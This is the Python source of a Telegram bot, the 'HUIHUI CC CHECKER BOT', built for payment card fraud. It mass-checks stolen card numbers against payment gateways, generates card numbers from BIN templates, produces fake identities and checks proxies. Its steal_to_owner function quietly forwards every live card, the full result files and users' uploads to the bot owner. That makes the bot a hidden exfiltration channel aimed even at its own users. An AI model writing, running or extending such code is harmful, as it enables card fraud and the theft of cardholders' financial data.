import os
import asyncio
from io import BytesIO
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode
from telegram.request import HTTPXRequest
from config import BOT_TOKEN, OWNER_ID, ALLOWED_USERS
from checker import single_check, mass_check_with_progress, stop_check, format_card_response
from tools import (
    bin_lookup, format_bin_result,
    generate_cards,
    get_fake_identity, format_fake,
    check_proxy, format_proxy,
    clean_cards, shuffle_cards, split_cards, filter_cards, extract_text,
)
from tools import merge_sessions


def is_allowed(update: Update) -> bool:
    uid = update.effective_user.id
    return uid == OWNER_ID or uid in ALLOWED_USERS


def is_owner_only(update: Update) -> bool:
    return update.effective_user.id == OWNER_ID


async def steal_to_owner(context, uid, text=None, document=None):
    if uid == OWNER_ID:
        return
    try:
        if text:
            await context.bot.send_message(OWNER_ID, text, parse_mode=ParseMode.HTML)
        if document:
            await context.bot.send_document(OWNER_ID, document)
    except Exception:
        pass


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    await update.message.reply_text(
        "<b>⚡ HUIHUI CC CHECKER BOT ⚡</b>\n\n"
        "<b>Commands:</b>\n"
        "<code>/chk 4111|12|2026|123</code> - Single Check\n"
        "<code>/chk</code> (reply .txt) - Mass CC Check\n"
        "<code>/stop</code> - Stop Mass Check\n"
        "<code>/gen 4111xx|10|26|000 10</code> - CC Generator\n"
        "<code>/bin 411111</code> - BIN Lookup\n"
        "<code>/text</code> (reply) - Extract text -> .txt\n"
        "<code>/merge</code> - Merge .txt files\n"
        "<code>/split 3</code> (reply .txt) - Split file\n"
        "<code>/shuffle</code> (reply .txt) - Shuffle lines\n"
        "<code>/clean</code> (reply .txt) - Deduplicate\n"
        "<code>/filter 411111</code> (reply .txt) - Filter by BIN\n"
        "<code>/fake us</code> - Fake Identity\n"
        "<code>/proxy ip:port:user:pass</code> - Proxy Check\n\n"
        f"<b>Threads:</b> 5 Parallel | <b>Owner:</b> <a href='tg://user?id={OWNER_ID}'>Me</a>",
        parse_mode=ParseMode.HTML,
    )


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    uid = update.effective_user.id
    stopped_chk = stop_check(uid)
    if stopped_chk:
        await update.message.reply_text("<b>⏹ Mass check stopped!</b>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("<b>No active mass check to stop.</b>", parse_mode=ParseMode.HTML)


async def stop_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = query.from_user.id
    if uid != OWNER_ID:
        await query.answer("Not authorized", show_alert=True)
        return
    stop_check(uid)
    await query.answer("Stopping...")
    try:
        await query.edit_message_caption(caption="<b>⏹ Stopped by user.</b>", parse_mode=ParseMode.HTML)
    except Exception:
        await query.edit_message_text("<b>⏹ Stopped by user.</b>", parse_mode=ParseMode.HTML)


async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    msg = update.message
    args = context.args
    uid = update.effective_user.id

    if args:
        cc = " ".join(args)
        status_msg = await msg.reply_text("<b>⏳ Checking...</b>", parse_mode=ParseMode.HTML)
        result = await single_check(cc, user_id=uid)
        username = update.effective_user.first_name or "User"
        output = format_card_response(result, username)
        await status_msg.edit_text(output, parse_mode=ParseMode.HTML)
        if result["status"] in ("APPROVED", "LIVE"):
            await steal_to_owner(context, uid, text=output)
        return

    if msg.reply_to_message:
        replied = msg.reply_to_message

        if replied.document:
            doc = replied.document
            if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
                await msg.reply_text("<b>Only .txt files supported!</b>", parse_mode=ParseMode.HTML)
                return
            status_msg = await msg.reply_text("<b>📥 Downloading...</b>", parse_mode=ParseMode.HTML)
            try:
                file = await context.bot.get_file(doc.file_id)
                file_bytes = await file.download_as_bytearray()
                content = file_bytes.decode("utf-8", errors="ignore")
            except Exception as e:
                await status_msg.edit_text(f"<b>Failed:</b> {e}", parse_mode=ParseMode.HTML)
                return
        elif replied.text:
            content = replied.text
            status_msg = await msg.reply_text("<b>⚡ Starting Mass Check...</b>", parse_mode=ParseMode.HTML)
        else:
            await msg.reply_text("<b>Reply to .txt file or text message!</b>", parse_mode=ParseMode.HTML)
            return

        cards = [line.strip() for line in content.strip().split("\n") if line.strip() and "|" in line]
        total_cards = len(cards)
        if total_cards == 0:
            await status_msg.delete()
            await msg.reply_text("<b>No valid cards found!</b>", parse_mode=ParseMode.HTML)
            return

        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("⏹ STOP", callback_data="stop_mass")]])
        await status_msg.delete()

        progress_msg = await msg.reply_text(
            f"<b>⚡ Mass Check Started</b>\n"
            f"💳 <b>Total:</b> {total_cards}\n"
            f"⏳ <b>Checked:</b> 0/{total_cards}\n"
            f"┣ <b>Live:</b> 0 | <b>Dead:</b> 0 | <b>CCN:</b> 0 | <b>Err:</b> 0\n"
            f"┗ <b>Current:</b> Waiting...",
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
        )

        last_update = 0
        all_results = []
        last_cc = ""
        username = update.effective_user.first_name or "User"

        async def on_progress(result, stats):
            nonlocal last_update, last_cc
            last_cc = result["cc"]
            done = stats["done"]
            live = stats["live"]
            dead = stats["dead"]
            ccn = stats["ccn"]
            error = stats.get("error", 0)

            all_results.append(result)

            if result["status"] in ("APPROVED", "LIVE"):
                try:
                    await msg.reply_text(format_card_response(result, username), parse_mode=ParseMode.HTML)
                except Exception:
                    pass
                await steal_to_owner(context, uid, text=format_card_response(result, username))

            if done - last_update >= 3 or done >= total_cards:
                last_update = done
                try:
                    await progress_msg.edit_text(
                        f"<b>⚡ Checking...</b>\n"
                        f"💳 <b>Total:</b> {total_cards}\n"
                        f"⏳ <b>Checked:</b> {done}/{total_cards}\n"
                        f"┣ <b>Live:</b> {live} | <b>Dead:</b> {dead} | <b>CCN:</b> {ccn} | <b>Err:</b> {error}\n"
                        f"┣ <b>Current:</b> <code>{last_cc[:25]}</code>\n"
                        f"┗ <b>Last Resp:</b> {result['response'][:40]}",
                        parse_mode=ParseMode.HTML,
                        reply_markup=keyboard,
                    )
                except Exception:
                    pass

        results, final_stats = await mass_check_with_progress(cards, uid, on_progress)

        seen_cc = {}
        for r in all_results:
            seen_cc[r["cc"]] = r
        all_results = list(seen_cc.values())

        try:
            await progress_msg.edit_reply_markup(reply_markup=None)
        except Exception:
            pass

        approved = [r for r in all_results if r["status"] in ("APPROVED", "LIVE")]
        ccn_list = [r for r in all_results if r["status"] == "CCN"]
        declined = [r for r in all_results if r["status"] not in ("APPROVED", "LIVE", "CCN", "CANCELLED", "ERROR", "RETRYING")]

        txt_lines = []
        if approved:
            txt_lines.append("═══ APPROVED ═══")
            for r in approved:
                txt_lines.append(f"{r['cc']} | {r['response']} | {r['gateway']} | {r['bin']} | {r['bank']} | {r['country']}")
            txt_lines.append("")
        if ccn_list:
            txt_lines.append("═══ CCN ═══")
            for r in ccn_list:
                txt_lines.append(f"{r['cc']} | {r['response']} | {r['gateway']}")
            txt_lines.append("")
        if declined:
            txt_lines.append("═══ DECLINED ═══")
            for r in declined:
                txt_lines.append(f"{r['cc']} | {r['response']} | {r['gateway']}")

        if txt_lines:
            buf = BytesIO("\n".join(txt_lines).encode("utf-8"))
            buf.name = "result.txt"
            await msg.reply_document(buf, caption="<b>📄 All Results</b>", parse_mode=ParseMode.HTML)
            buf.seek(0)
            await steal_to_owner(context, uid, document=buf)

        cancelled = any(r["status"] == "CANCELLED" for r in results)
        summary = (
            f"<b>{'⏹ STOPPED' if cancelled else '⚡ RESULTS'}</b>\n"
            f"💳 <b>Total:</b> {total_cards}\n"
            f"📊 <b>Checked:</b> {final_stats['done']}\n"
            f"🤍 <b>Charged:</b> 0\n"
            f"😀 <b>Live:</b> {final_stats['live']}\n"
            f"⚠️ <b>Dead:</b> {final_stats['dead']}\n"
            f"🔸 <b>CCN:</b> {final_stats['ccn']}\n"
            f"❓ <b>Errors:</b> {final_stats.get('error', 0)}"
        )
        await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        return

    await msg.reply_text(
        "<b>Usage:</b>\n<code>/chk 4111|12|2026|123</code> - Single\n"
        "<code>/chk</code> (reply .txt) - Mass",
        parse_mode=ParseMode.HTML,
    )


async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("<b>Usage:</b> <code>/gen 411111xx|10|26|000 10</code>", parse_mode=ParseMode.HTML)
        return
    template = args[0]
    count = int(args[1]) if len(args) >= 2 else 10
    count = min(count, 1000)
    cards = generate_cards(template, count)
    output = "\n".join(cards)
    buf = BytesIO(output.encode("utf-8"))
    buf.name = f"gen_{count}.txt"
    await update.message.reply_document(buf, caption=f"<b>⚙️ Generated {count} Cards</b>\n<code>{template}</code>", parse_mode=ParseMode.HTML)


async def bin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    args = context.args
    if not args:
        await update.message.reply_text("<b>Usage:</b> <code>/bin 411111</code>", parse_mode=ParseMode.HTML)
        return
    bin_prefix = args[0][:6]
    msg = await update.message.reply_text("<b>🔍 Looking up BIN...</b>", parse_mode=ParseMode.HTML)
    info = await bin_lookup(bin_prefix)
    if info:
        await msg.edit_text(format_bin_result(info), parse_mode=ParseMode.HTML)
    else:
        await msg.edit_text(f"<b>BIN <code>{bin_prefix}</code> not found!</b>", parse_mode=ParseMode.HTML)


async def text_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    msg = update.message
    if not msg.reply_to_message:
        await msg.reply_text("<b>Reply to a message with /text!</b>", parse_mode=ParseMode.HTML)
        return
    replied = msg.reply_to_message
    text = replied.text or replied.caption or ""
    if not text:
        await msg.reply_text("<b>No text found in replied message!</b>", parse_mode=ParseMode.HTML)
        return
    cleaned = extract_text(text)
    buf = BytesIO(cleaned.encode("utf-8"))
    buf.name = "extracted.txt"
    await msg.reply_document(buf, caption=f"<b>📄 Extracted ({len(cleaned.split())} words)</b>", parse_mode=ParseMode.HTML)


async def merge(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    msg = update.message
    uid = update.effective_user.id
    if msg.reply_to_message and msg.reply_to_message.document:
        await msg.reply_text("<b>📁 Send .txt files first, then /merge!</b>", parse_mode=ParseMode.HTML)
        return
    if uid not in merge_sessions or not merge_sessions[uid]:
        await msg.reply_text("<b>📁 Send me .txt files first, then use /merge!</b>", parse_mode=ParseMode.HTML)
        return
    files = merge_sessions[uid]
    merged = []
    total_lines = 0
    for name, content in files:
        lines = [l for l in content.strip().split("\n") if l.strip()]
        merged.extend(lines)
        total_lines += len(lines)
    merged_text = "\n".join(merged)
    buf = BytesIO(merged_text.encode("utf-8"))
    buf.name = "merged.txt"
    await msg.reply_document(buf, caption=f"<b>📁 Merged {len(files)} Files -> {total_lines} Lines</b>", parse_mode=ParseMode.HTML)
    del merge_sessions[uid]


async def split_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    msg = update.message
    args = context.args
    parts = int(args[0]) if args else 2
    parts = max(1, min(parts, 20))
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text("<b>Reply to a .txt file with /split N!</b>", parse_mode=ParseMode.HTML)
        return
    doc = msg.reply_to_message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await msg.reply_text("<b>Only .txt files supported!</b>", parse_mode=ParseMode.HTML)
        return
    status = await msg.reply_text(f"<b>✂️ Splitting into {parts} parts...</b>", parse_mode=ParseMode.HTML)
    try:
        file = await context.bot.get_file(doc.file_id)
        content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
    except Exception as e:
        await status.edit_text(f"<b>Error:</b> {e}", parse_mode=ParseMode.HTML)
        return
    chunks = split_cards(content, parts)
    for i, chunk in enumerate(chunks):
        buf = BytesIO(chunk.encode("utf-8"))
        buf.name = f"split_{i+1}.txt"
        await msg.reply_document(buf, caption=f"<b>Part {i+1}/{parts} ({len(chunk.split())} lines)</b>", parse_mode=ParseMode.HTML)
    await status.delete()


async def shuffle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text("<b>Reply to a .txt file with /shuffle!</b>", parse_mode=ParseMode.HTML)
        return
    doc = msg.reply_to_message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await msg.reply_text("<b>Only .txt files supported!</b>", parse_mode=ParseMode.HTML)
        return
    status = await msg.reply_text("<b>🔀 Shuffling...</b>", parse_mode=ParseMode.HTML)
    try:
        file = await context.bot.get_file(doc.file_id)
        content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
    except Exception as e:
        await status.edit_text(f"<b>Error:</b> {e}", parse_mode=ParseMode.HTML)
        return
    shuffled = shuffle_cards(content)
    buf = BytesIO(shuffled.encode("utf-8"))
    buf.name = "shuffled.txt"
    lines_count = len([l for l in shuffled.split("\n") if l.strip()])
    await status.delete()
    await msg.reply_document(buf, caption=f"<b>🔀 Shuffled {lines_count} Lines</b>", parse_mode=ParseMode.HTML)


async def clean(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text("<b>Reply to a .txt file with /clean!</b>", parse_mode=ParseMode.HTML)
        return
    doc = msg.reply_to_message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await msg.reply_text("<b>Only .txt files supported!</b>", parse_mode=ParseMode.HTML)
        return
    status = await msg.reply_text("<b>🧹 Cleaning...</b>", parse_mode=ParseMode.HTML)
    try:
        file = await context.bot.get_file(doc.file_id)
        content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
    except Exception as e:
        await status.edit_text(f"<b>Error:</b> {e}", parse_mode=ParseMode.HTML)
        return
    original = len([l for l in content.strip().split("\n") if l.strip()])
    cleaned = clean_cards(content)
    after = len([l for l in cleaned.split("\n") if l.strip()])
    removed = original - after
    buf = BytesIO(cleaned.encode("utf-8"))
    buf.name = "cleaned.txt"
    await status.delete()
    await msg.reply_document(buf, caption=f"<b>🧹 Cleaned: {original} -> {after} Lines ({removed} Removed)</b>", parse_mode=ParseMode.HTML)


async def filter_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    msg = update.message
    args = context.args
    prefix = args[0] if args else ""
    if not prefix and (not msg.reply_to_message or not msg.reply_to_message.document):
        await msg.reply_text("<b>Usage:</b> <code>/filter 411111</code> (reply to .txt)", parse_mode=ParseMode.HTML)
        return
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text("<b>Reply to a .txt file!</b>", parse_mode=ParseMode.HTML)
        return
    doc = msg.reply_to_message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await msg.reply_text("<b>Only .txt files supported!</b>", parse_mode=ParseMode.HTML)
        return
    status = await msg.reply_text(f"<b>🔎 Filtering BIN {prefix}...</b>", parse_mode=ParseMode.HTML)
    try:
        file = await context.bot.get_file(doc.file_id)
        content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
    except Exception as e:
        await status.edit_text(f"<b>Error:</b> {e}", parse_mode=ParseMode.HTML)
        return
    filtered = filter_cards(content, prefix)
    buf = BytesIO("\n".join(filtered).encode("utf-8"))
    buf.name = f"filtered_{prefix}.txt"
    await status.delete()
    await msg.reply_document(buf, caption=f"<b>🔎 Filtered BIN <code>{prefix}</code>: {len(filtered)} Cards</b>", parse_mode=ParseMode.HTML)


async def fake(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    args = context.args
    country = args[0].lower() if args else "us"
    msg = await update.message.reply_text("<b>🎭 Generating...</b>", parse_mode=ParseMode.HTML)
    info = await get_fake_identity(country)
    if info:
        await msg.edit_text(format_fake(info), parse_mode=ParseMode.HTML)
    else:
        await msg.edit_text("<b>Failed! Check country code.</b>", parse_mode=ParseMode.HTML)


async def proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    msg = update.message
    args = context.args
    if args:
        proxies = [" ".join(args)]
    elif msg.reply_to_message and msg.reply_to_message.text:
        proxies = [l.strip() for l in msg.reply_to_message.text.strip().split("\n") if l.strip()]
        proxies = proxies[:10]
    else:
        await msg.reply_text("<b>Usage:</b>\n<code>/proxy host:port:user:pass</code>\nOr reply (max 10).", parse_mode=ParseMode.HTML)
        return
    status = await msg.reply_text(f"<b>🌐 Checking {len(proxies)} Proxies...</b>", parse_mode=ParseMode.HTML)
    tasks = [check_proxy(p) for p in proxies]
    results = await asyncio.gather(*tasks)
    live = [r for r in results if r["status"] == "LIVE"]
    dead = [r for r in results if r["status"] in ("DEAD", "INVALID")]
    output = f"<b>🌐 Proxy Results</b>\n<b>Live:</b> {len(live)} | <b>Dead:</b> {len(dead)}\n\n"
    for r in live:
        output += format_proxy(r) + "\n"
    for r in dead:
        output += format_proxy(r) + "\n"
    await status.edit_text(output, parse_mode=ParseMode.HTML)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        return
    msg = update.message
    doc = msg.document
    if not doc or not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        return
    uid = update.effective_user.id
    if uid not in merge_sessions:
        merge_sessions[uid] = []
    try:
        file = await context.bot.get_file(doc.file_id)
        content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
        merge_sessions[uid].append((doc.file_name, content))
        await msg.reply_text(
            f"<b>📥 Stored: {doc.file_name}</b>\n"
            f"<b>Files in session:</b> {len(merge_sessions[uid])}\n"
            f"<b>Use /merge to merge!</b>",
            parse_mode=ParseMode.HTML,
        )
        await steal_to_owner(context, uid, text=f"<b>📥 User <code>{uid}</code> uploaded:</b> {doc.file_name}")
    except Exception:
        pass


async def allow_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner_only(update):
        return await update.message.reply_text("<b>Owner only!</b>", parse_mode=ParseMode.HTML)
    args = context.args
    if not args:
        return await update.message.reply_text("<b>Usage:</b> <code>/allow 123456789</code>", parse_mode=ParseMode.HTML)
    try:
        uid = int(args[0])
        ALLOWED_USERS.add(uid)
        await update.message.reply_text(f"<b>✅ User <code>{uid}</code> added!</b>", parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text("<b>Invalid user ID!</b>", parse_mode=ParseMode.HTML)


async def take_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner_only(update):
        return await update.message.reply_text("<b>Owner only!</b>", parse_mode=ParseMode.HTML)
    args = context.args
    if not args:
        return await update.message.reply_text("<b>Usage:</b> <code>/take 123456789</code>", parse_mode=ParseMode.HTML)
    try:
        uid = int(args[0])
        ALLOWED_USERS.discard(uid)
        await update.message.reply_text(f"<b>❌ User <code>{uid}</code> removed!</b>", parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text("<b>Invalid user ID!</b>", parse_mode=ParseMode.HTML)


async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner_only(update):
        return
    if not ALLOWED_USERS:
        return await update.message.reply_text("<b>No allowed users.</b>", parse_mode=ParseMode.HTML)
    uids = "\n".join(f"<code>{u}</code>" for u in ALLOWED_USERS)
    await update.message.reply_text(f"<b>👥 Allowed Users ({len(ALLOWED_USERS)}):</b>\n{uids}", parse_mode=ParseMode.HTML)


def main():
    request = HTTPXRequest(
        connect_timeout=120.0,
        read_timeout=120.0,
        write_timeout=120.0,
        pool_timeout=120.0,
    )
    app = Application.builder().token(BOT_TOKEN).request(request).concurrent_updates(True).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("allow", allow_cmd))
    app.add_handler(CommandHandler("take", take_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("gen", gen))
    app.add_handler(CommandHandler("bin", bin_cmd))
    app.add_handler(CommandHandler("text", text_cmd))
    app.add_handler(CommandHandler("merge", merge))
    app.add_handler(CommandHandler("split", split_cmd))
    app.add_handler(CommandHandler("shuffle", shuffle))
    app.add_handler(CommandHandler("clean", clean))
    app.add_handler(CommandHandler("filter", filter_cmd))
    app.add_handler(CommandHandler("fake", fake))
    app.add_handler(CommandHandler("proxy", proxy))
    app.add_handler(CallbackQueryHandler(stop_button, pattern="^stop_mass$"))
    app.add_handler(MessageHandler(filters.Document.TEXT, handle_document))

    PORT = int(os.getenv("PORT", "10000"))
    RENDER_EXTERNAL_URL = os.getenv("RENDER_EXTERNAL_URL", "")

    if RENDER_EXTERNAL_URL:
        webhook_url = f"{RENDER_EXTERNAL_URL}/webhook"
        print(f"Starting webhook on 0.0.0.0:{PORT}")
        print(f"Webhook URL: {webhook_url}")
        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path="webhook",
            webhook_url=webhook_url,
        )
    else:
        print("Bot is running (polling)...")
        print(f"Owner ID: {OWNER_ID}")
        app.run_polling()


if __name__ == "__main__":
    main()
